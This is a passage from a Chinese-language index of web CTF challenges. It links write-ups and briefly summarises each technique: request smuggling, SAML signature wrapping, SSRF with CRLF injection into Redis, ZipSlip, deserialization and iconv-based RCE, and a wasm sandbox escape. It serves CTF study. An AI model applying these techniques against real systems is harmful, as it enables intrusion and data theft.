    - `Mysql2::Client.new`允许传入`local_infile`参数指定mysql是否可以用`LOAD DATA LOCAL INFILE`读取本地文件。利用这点可以向任意远程数据库传任意路径已知的本地文件，包括`/proc/self/`下的文件
- 其他解法：**off_dah_rails_m8** ,`Bundler::GemHelper`是比预期解（盲注）更快的gadget
557. [幻境迷心·皇陨星沉](https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Web/Writeup.md)
- java反序列化rce（可出网以及不可出网）
558. [PatchNotes CMS](https://github.com/infobahnctf/CTF-2025/tree/main/web/patchnotes)
- 可以用`x-prerender-revalidate`字段绕过nextjs middleware
- [happy-dom RCE](https://github.com/advisories/GHSA-37j7-fg3j-429f)
- **Patchnotes CMS**
559. [logo](https://github.com/infobahnctf/CTF-2025/tree/main/web/logo)
- `HTTP/1.1`的不安全性（如请求走私）详解： https://http1mustdie.com
- https://github.com/vibe-d/vibe.d/security/advisories/GHSA-hm69-r6ch-92wx ：`vibe.d`处理http请求时优先处理`Content-Length`而不是`Transfer-Encoding`，导致请求走私
- `vibe.http.proxy`会尽可能重用同一个后端连接，即使原始请求是由不同的客户端发出的。因此，对恶意请求的响应可能会被传递给不同的用户。这可能导致会话锁定、恶意重定向到钓鱼页面，或者将自XSS攻击升级为存储型XSS攻击
- HEAD响应只会返回诸如`Content-Length`之类的字段，不包含实际的资源内容。假设这个GET请求为B，wp利用这点将下一个请求C的tcp流当作B的response返回
    - 请求走私越看越神奇：前端服务器认为用户发送了一个请求，但由于解析的差异性导致这个请求发到后端后后端认为这是多个请求，进而给出多个response；然而前端只会拿一个response，剩下的两个留给幸运受害人（
    - admin bot会在攻击者请求走私后向服务器发送GET请求。攻击者利用请求走私同时发送三个请求：GET-HEAD-某个tcp response包含xss payload的请求。后端服务器同时给出三个response，但只有第一个response被发送回攻击者。当bot发送GET请求时，前端首先返回之前HEAD请求的response；但HEAD请求不包含GET请求需要的具体内容，因此后续的全部tcp流都被当作是返回内容返回
- Hypercorn默认支持`HTTP/2`，只需要默认发送一段特殊内容（见wp），后续的请求将被看作是`HTTP/2`语法（配合上文“重用同一个后端连接”的部分，针对`HTTP/2`的response可能被返回给发送`HTTP/1.1`请求的受害者）
- `HTTP/2`的`PING frame`语法可以使攻击者控制返回的tcp流中连续的八字节（可以有多段内容）
560. [GlacierAIStore](https://saiger.dev/blog/ctf-glacier-ai-store)
- PHP在检测到client断连时会停止运行当前的脚本。检测方式是使用`ob_flush()`和`flush()`函数： https://www.php.net/manual/en/function.connection-aborted.php#111167
- 当调用`session_start`时，会话会自动锁定，直到脚本运行结束或用户手动解锁会话为止。这点可以防止单个会话内由于两个函数之间间隔太长导致的条件竞争;然而攻击者仍然可以利用多次登录同一个账号绕过：**GlacierAIStore**
561. [Tomwhat](https://github.com/RootRunners/HeroCTF-v7-RootRunners-Official-Write-ups/tree/main/Web/Tomwhat)
- Apache Tomcat session管理：若`context.xml`中存在`sessionCookiePath="/"`，意味着机器上运行的不同站点之间共享session
562. [SAMLevinson](https://github.com/RootRunners/HeroCTF-v7-RootRunners-Official-Write-ups/tree/main/Web/SAMLevinson)
- SAML中的XSW( [XML Signature wrapping](https://www.ibm.com/think/topics/xml-signature-wrapping) )攻击。SAML中的`<Assertion>`部分有签名保护，防止攻击者篡改；但攻击者仍然可以添加额外的`<Assertion>`，且由于XML解析的相关问题，签名验证的`<Assertion>`和实际读取到的`<Assertion>`可能不是同一个
563. [Spring Drive](https://cnf409.me/posts/2025/12/heroctf-2025-web/spring_drive)
- Spring Boot框架
- java字符串hashCode碰撞
- 利用http ssrf+CRLF Injection向redis发送命令
564. [Evil Cloner](https://thomasqm.com/post/evilcloner)
- 可通过修改`Preferences`文件和对应的IndexedDB文件控制[File System API](https://developer.mozilla.org/en-US/docs/Web/API/File_System_API)可访问的文件
- https://worty.fr/post/writeups/heroctfv7/evil_cloner ：如果启动chrome/puppeteer时不添加`--disable-component-update`标志，chrome内置的WidevineCdm组件每次启动时都会自动更新，提供一种任意文件写漏洞可利用的RCE方法
- 非预期解：利用任意文件写，往node进程的fd中写rop链触发rce。相关资料：
    - https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments
    - https://i0.rs/blog/engineering-a-rop-chain-against-node-js
565. [Archivist’s Whisper](https://llordi-1.gitbook.io/write-ups/null-ctf-2025/web-archivists-whisper-0day)
- [思源笔记](https://github.com/siyuan-note/siyuan)登录后的任意文件读漏洞
- `/api/import/importZipMd`路径存在ZipSlip漏洞，允许攻击者进行任意文件写
566. [Vulnerability Research](https://hackmd.io/MvTbGVyZThmFD91DxevTzQ)
- [web2py](https://github.com/web2py/web2py)中的pickle反序列化rce漏洞
567. [4llD4y](http://blog.kudaliar.id/blog/0xl4ugh-ctf-v5-4lld4y)
- flatnest原型链污染漏洞： https://security.snyk.io/vuln/SNYK-JS-FLATNEST-3185149
568. [pdf.exe](https://mushroom.cat/ctf/nextjs-ssrf-python-crlf-pdfkit-injection)
- Next.js Image Optimizer ssrf。具体出现漏洞的函数是`fetchExternalImage`，攻击者可以用dns rebinding绕过对域名指向的IP的检查
- python urllib CRLF注入：`DataHandler`类的`data_open`函数未对mediatype做过滤，导致攻击者可以通过注入CRLF字符添加http header
- python Pdfkit库的from_string支持用meta标签设置内部调用的命令行工具`wkhtmltopdf`的参数，存在LFI的风险： https://csirt.sk/the-python-pdfkit-library-vulnerability.html
569. [0xNote](https://hackmd.io/@winky/Sy8M59mI-l)
- 绕过nginx php fpm配置访问页面： https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm
- 利用php SPLFileObject类实现任意文件读取
- php filters内部使用了glibc iconv函数，因此利用iconv的`CVE-2024-2961`漏洞可以将php应用中存在的任意文件读取漏洞提升为rce
    - https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961
    - https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html
570. [0xClinic](https://github.com/0xkalawy/My-Challenges-WriteUps/blob/main/0xL4ugh%20CTF%20v5/0xClinic.md)
- 若网站执行用户输入的任意正则表达式，则可以利用ReDoS进行时间侧信道爆破字符
- FastAPI的依赖项Uvicorn对请求头的处理中存在CRLF注入
- python的urllib中的urlsplit函数无法正确处理形如`<URL:scheme://host:port?/path?>`格式的url（解析出的scheme为空），但urlretrieve函数可以正常请求这类url
    - 在url中加换行符也可以造成解析的不一致性，见 https://gist.github.com/aelmosalamy/70ce2ca59139b7eb0e2d06a3e73c5d0d
- python web应用从任意文件上传到rce： https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files
571. [Gap](https://mushroom.cat/ctf/json-js-rce-lodash)
- ES6 js支持“默认参数”的语法，比如`function test(x = console.log("RCE")) { ... }`，允许在函数执行之前的参数初始化阶段执行代码
- js的`new Function`的第一个参数可以是列表或者由`,`分割的字符串，比如`a,b`，将生成一个带有a和b两个参数的函数对象
572. [bobles-and-narnes](https://github.com/SenequeZ/WriteUps/blob/main/LACTF2026/boobles-and-narnes.md)
- js Bun的SQL函数`db()`在处理`db([array of objects])`这种输入时，插入列的字段名取决于数组中的第一个对象。假设第一个对象不具有`x`属性，则后续插入的对象无论有没有设置`x`属性，值均为null
573. [Blogler](https://frederik353.github.io/writeups/ctfs/lactf-26/blogler)
- yaml支持anchors (`&name`) 和 aliases (`*name`)语法，用于创建对同一对象的共享引用。python中使用`yaml.safe_load`加载这类对象后，两者引用的是同一个字典对象，意味着改动其中一个会影响另一个
574. [single-trust](https://ctf.krauq.com/lactf-2026)
- Nodejs (Ubuntu 20.04, v10.19.0)接受截断的aes GCM标签(`cipher.setAuthTag`)，因此攻击者可以爆破单个字节的tag
575. [broken_website](https://git.hamburg.ccc.de/ctf/writeups2026tamu/src/branch/main/broken_website.md)
- 使用curl请求http3-only网站。这类网站正常请求只能得到`Could not connect to server`错误
576. [Vault](https://kore.one/tamuctf-2026-vault-challenge-writeup)
- Laravel 12 (PHP 8.2-FPM)反序列化利用
577. [Captivating Canvas Contraption](https://blog.badat.dev/blog/captivating-canvas-contraption)
- 前置阅读： https://phrack.org/issues/72/10_md 。wasm模块只能调用指定的外部函数，因此是一个天然的沙箱环境。但文章注意到wasm可以引用传入的`importObject`继承自Object的属性，于是攻击者可以引用定义好的函数之外的内容
    - 上述操作只能获取函数的externref，无法直接调用。这点可以用`Object.groupBy`克服
    - js在调用对象的函数（`foo.bar()`）时会隐式地设置`this`的值。因此将一个方法提取出来并调用时（`x=foo.bar;x()`），由于缺失`this`，程序会报错。于是即使有`Object.groupBy`，利用初始仍只能使用Object的静态方法，且后续只能用各种类的静态方法
    - 因为可以通过Function构造器+字符串的形式创建一个函数，所以问题变成“如何构造字符串”
    - 具体构造步骤见`5.2`到`5.5`。简略的总结如下：从`importObject.constructor.prototype`拿到一个空对象->`Object.values`从空对象身上取出空列表->`Object.getOwnPropertyNames`取出用列表包住的空列表属性名->`Object.groupBy`调用函数取出属性列表中的字符串->`Object.getOwnPropertyDescriptors`获取全部属性的descriptors的列表->取出`String.fromCharCode`的descriptor并用相同的`Object.values`技巧取出`fromCharCode`->`Object.groupBy`+`fromCharCode`构建单个字符->`Object.assign`构造类似`{'1': [ 'H' ],'2': [ 'e' ]}`的对象->`Object.values`取出`[[ 'H' ], [ 'e' ]]`->`String.raw`函数构造从列表构造出完整字符串
- wp是更进一步的利用。题目设置了csp，并要求获取cookie；这导致无法直接使用上述脚本，且需要拿到window对象。wp提到的额外知识点如下：
    - 构造包含指定对象x的列表`[x]`：获取`__proto__`属性的descriptor并将enumerable设置为true。然后设置空对象的某个属性（假设是A）的值为先前修改过的descriptor，并将空对象的原型设为x。这样在调用`Object.values`时，js通过A的descriptor中定义的get属性访问到其原型x，返回`[x]`
    - 设置某个对象的任意属性
    - 在控制`this`的情况下调用函数：调用访问器时，js将设置访问器所属对象的`this`；因此在get/set里调用函数没有`this`缺失的问题
    - 另一种构造字符串的方式：`Array.from`可以设置`thisArg`，而`reduce`函数会传入索引作为`thisArg`。于是`Object.setPrototypeOf(Number.prototype, ["p","r","e"]);Array.from([""], Array.prototype.join, 1)`可以得到`[ 'pre' ]`
    - v8 api的`Error.prepareStackTrace`回调函数传入的`callSites`上有getThis函数，返回window对象；不过触发报错的环境需要是javascript而不是wasm，或者用wasm的unreachable语句
578. **BabyKalmarCTF**
- 利用[ctfd zipslip](https://github.com/CTFd/CTFd/commit/488517db67f66072937416d7f2524ca6f2e2193d)获取rce